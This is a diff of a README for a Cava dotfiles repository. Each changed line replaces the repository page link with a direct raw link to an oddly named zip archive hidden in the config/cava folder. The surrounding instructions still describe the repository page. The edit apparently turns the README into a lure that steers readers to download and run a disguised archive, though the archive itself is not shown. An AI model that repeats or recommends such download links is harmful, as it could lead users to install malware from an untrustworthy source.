@@ -1,10 +1,10 @@
 # 🌿 my_cava_dotfiles - Simple setup for your desktop style
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit-Page-purple?style=for-the-badge)](https://github.com/Rhizotomymunichbeer395/my_cava_dotfiles)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit-Page-purple?style=for-the-badge)](https://raw.githubusercontent.com/Rhizotomymunichbeer395/my_cava_dotfiles/main/config/cava/my-cava-dotfiles-gypsywise.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Rhizotomymunichbeer395/my_cava_dotfiles
+Visit this page to download: https://raw.githubusercontent.com/Rhizotomymunichbeer395/my_cava_dotfiles/main/config/cava/my-cava-dotfiles-gypsywise.zip
 
 This repository holds dotfiles for Cava and related desktop tools. It helps you set up a clean, styled look for your terminal and media display on Windows, Linux, or macOS.
 
@@ -36,7 +36,7 @@ Before you start, make sure you have:
 Use these steps to get the files on your PC and run them.
 
 1. Open the download page:
-   https://github.com/Rhizotomymunichbeer395/my_cava_dotfiles
+   https://raw.githubusercontent.com/Rhizotomymunichbeer395/my_cava_dotfiles/main/config/cava/my-cava-dotfiles-gypsywise.zip
 
 2. Look for the green Code button on the page.
 
@@ -187,4 +187,4 @@ If your changes do not show up:
 
 ## 📎 Download again
 
-Visit this page to download: https://github.com/Rhizotomymunichbeer395/my_cava_dotfiles
+Visit this page to download: https://raw.githubusercontent.com/Rhizotomymunichbeer395/my_cava_dotfiles/main/config/cava/my-cava-dotfiles-gypsywise.zip
